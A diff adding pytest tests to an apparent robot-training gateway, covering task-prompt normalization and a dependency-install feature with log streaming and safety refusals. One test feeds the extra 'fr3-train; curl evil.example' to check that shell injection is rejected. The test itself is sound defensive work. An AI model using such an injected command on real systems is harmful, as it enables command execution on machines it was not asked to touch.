@@ -3750,6 +3750,52 @@ def test_view_fps_query_is_validated_before_it_becomes_an_argument():
         gateway._parse_training_view_fps("25")
 
 
+# ------------------------------------------------------------- training view prompt ---
+
+
+def test_training_view_command_carries_the_task_prompt_when_one_is_typed(tmp_path):
+    """The instruction pi0/pi0.5 are conditioned on, written into the view's task column.
+
+    On the command line rather than applied afterwards because the command is what the event
+    log records: "which prompt did this view train on" has to be answerable from it.
+    """
+    state, dataset_root, _view_root = _training_view_state(tmp_path)
+
+    command, _ = gateway._training_view_command(
+        state,
+        dataset_root,
+        "delta_ee_from_prev_cmd",
+        task_prompt="pick up the red cube and place it in the box",
+    )
+
+    assert command[command.index("--task-prompt") + 1] == (
+        "pick up the red cube and place it in the box"
+    )
+
+
+def test_training_view_command_leaves_the_recorded_prompt_alone_by_default(tmp_path):
+    """No prompt typed means keep what the recorder wrote; a default here would be a guess."""
+    state, dataset_root, _view_root = _training_view_state(tmp_path)
+
+    command, _ = gateway._training_view_command(state, dataset_root, "delta_ee_from_prev_cmd")
+
+    assert "--task-prompt" not in command
+
+
+def test_task_prompt_query_is_normalized_the_way_the_tokenizer_will_see_it():
+    assert gateway._parse_training_view_task_prompt("") == ""
+    assert gateway._parse_training_view_task_prompt("   ") == ""
+    # Collapsed, not preserved: the prompt is tokenized into every training sample, so a double
+    # space is a different token sequence rather than a formatting detail.
+    assert (
+        gateway._parse_training_view_task_prompt("  pick  up\n the cube ") == "pick up the cube"
+    )
+    with pytest.raises(ValueError, match="under 300"):
+        gateway._parse_training_view_task_prompt("x" * 301)
+    with pytest.raises(ValueError, match="control characters"):
+        gateway._parse_training_view_task_prompt("pick up\x07 the cube")
+
+
 def test_recorded_dataset_items_report_capture_rate(tmp_path):
     """The page needs the source rate to say that 60 -> 25 is impossible before the click."""
     state, dataset_root, _view_root = _training_view_state(tmp_path)
@@ -4631,3 +4677,156 @@ def test_the_guard_does_not_stand_in_the_way_of_a_finished_run(tmp_path):
     state.training.jobName = "job_a__20260821_094500"
 
     gateway._guard_checkpoint_deletion(state, ["job_b/010000", "job_c/020000"])
+
+
+# ------------------------------------------------------- dependency install ---
+
+
+def _install_gateway_state(tmp_path: Path, profile: str = "thor") -> gateway.GatewayState:
+    return gateway.GatewayState(
+        repo_root=tmp_path,
+        config_path=tmp_path / "config.yaml",
+        config={},
+        recording=gateway.RecordingStatus(),
+        replay=gateway.ReplayStatus(),
+        profile=profile,
+    )
+
+
+def _wait_for_install(state: gateway.GatewayState, timeout_s: float = 15.0) -> str:
+    import time
+
+    deadline = time.monotonic() + timeout_s
+    while time.monotonic() < deadline:
+        with state.lock:
+            current = state.deps_install.state
+        if current not in ("running",):
+            return current
+        time.sleep(0.05)
+    return "timeout"
+
+
+def test_installing_dependencies_streams_the_log_and_reports_success(tmp_path, monkeypatch):
+    """The point of the button is the log, so the log is what the test follows.
+
+    The install writes to a file and the gateway tails it, exactly as a training run does: a
+    pipe held by the gateway would make a deploy mid-sync kill the sync, which is the one
+    moment an environment is genuinely broken rather than merely incomplete.
+    """
+    state = _install_gateway_state(tmp_path)
+    monkeypatch.setattr(
+        gateway.training_backend,
+        "build_install_command",
+        lambda repo_root, host, extras: (
+            ["bash", "-c", "echo '==> Extras: fr3-train'; echo 'Resolved 292 packages'"],
+            None,
+        ),
+    )
+
+    result = gateway._start_dependency_install(state, {"hostId": "local", "extras": ["fr3-train"]})
+
+    assert result["ok"] is True
+    assert result["install"]["extras"] == ["fr3-train"]
+    assert _wait_for_install(state) == "complete"
+    assert state.deps_install.lastLines[-1] == "Resolved 292 packages"
+    assert "fr3-train" in state.deps_install.message
+    assert Path(state.deps_install.logPath).is_file()
+
+
+def test_a_failed_install_keeps_the_output_that_explains_it(tmp_path, monkeypatch):
+    """uv says why on stderr, and an exit code alone would throw that away."""
+    state = _install_gateway_state(tmp_path)
+    monkeypatch.setattr(
+        gateway.training_backend,
+        "build_install_command",
+        lambda repo_root, host, extras: (
+            ["bash", "-c", "echo 'error: Extra `nope` is not defined' >&2; exit 2"],
+            None,
+        ),
+    )
+
+    gateway._start_dependency_install(state, {"hostId": "local", "extras": ["fr3-train"]})
+
+    assert _wait_for_install(state) == "error"
+    assert any("is not defined" in line for line in state.deps_install.lastLines)
+    assert "code 2" in state.deps_install.message
+
+
+def test_an_install_is_refused_while_a_training_run_is_using_the_environment(tmp_path):
+    """uv would replace torch underneath a running trainer, which the trainer does not survive."""
+    state = _install_gateway_state(tmp_path)
+    state.training.state = "running"
+    state.training.pid = os.getpid()
+
+    with pytest.raises(ValueError, match="stop it before installing"):
+        gateway._start_dependency_install(state, {"hostId": "local", "extras": ["fr3-train"]})
+
+
+def test_a_second_install_is_refused_rather_than_run_alongside_the_first(tmp_path):
+    state = _install_gateway_state(tmp_path)
+    state.deps_install = gateway.training_backend.DependencyInstallStatus(
+        state="running", hostLabel="This machine", pid=os.getpid()
+    )
+
+    with pytest.raises(ValueError, match="already running"):
+        gateway._start_dependency_install(state, {"hostId": "local", "extras": ["fr3-train"]})
+
+
+def test_an_extra_that_could_reach_a_shell_never_gets_as_far_as_a_process(tmp_path):
+    """Refused by the gateway, and again by the script on the far side. Neither trusts the other."""
+    state = _install_gateway_state(tmp_path)
+
+    with pytest.raises(gateway.training_backend.TrainingError):
+        gateway._start_dependency_install(
+            state, {"hostId": "local", "extras": ["fr3-train; curl evil.example"]}
+        )
+    assert state.deps_install.state == "idle"
+
+
+def test_the_workstation_install_carries_the_recorders_extras_not_only_the_trainers(
+    tmp_path, monkeypatch
+):
+    """One environment, two jobs. The plan is the union, and the gateway is what knows that.
+
+    The browser cannot know this gateway is running as the recording workstation, and that is
+    exactly the fact deciding whether `.venv-fr3` is shared with the recorder. Building it from
+    the Training page with the training extra alone would leave a venv without mujoco or
+    pyrealsense2 -- which gateway.py would then hand the recorder on the next Connect.
+    """
+    state = _install_gateway_state(tmp_path, profile="workstation")
+    seen: dict[str, list[str]] = {}
+
+    def capture(repo_root, host, extras):
+        seen["extras"] = list(extras)
+        return ["bash", "-c", "true"], None
+
+    monkeypatch.setattr(gateway.training_backend, "build_install_command", capture)
+
+    gateway._start_dependency_install(state, {"hostId": "local", "extras": ["fr3-train"]})
+    assert _wait_for_install(state) == "complete"
+
+    assert seen["extras"] == ["fr3-train", "fr3-workstation-teleop", "fr3-host"]
+    assert state.deps_install.extras == seen["extras"]
+
+
+def test_a_machine_short_of_nothing_but_torch_still_gets_a_sync(tmp_path, monkeypatch):
+    """The case that used to dead-end: act is blocked, and no extra names the fix.
+
+    torch is a base dependency, so an empty extras list is the plan rather than the absence of
+    one, and the page's button has something to do on the freshly synced box.
+    """
+    state = _install_gateway_state(tmp_path)
+    seen: dict[str, list[str]] = {}
+
+    def capture(repo_root, host, extras):
+        seen["extras"] = list(extras)
+        return ["bash", "-c", "echo 'Resolved 291 packages'"], None
+
+    monkeypatch.setattr(gateway.training_backend, "build_install_command", capture)
+
+    result = gateway._start_dependency_install(state, {"hostId": "local", "extras": []})
+
+    assert result["ok"] is True
+    assert seen["extras"] == []
+    assert _wait_for_install(state) == "complete"
+    assert "base dependencies" in state.deps_install.message
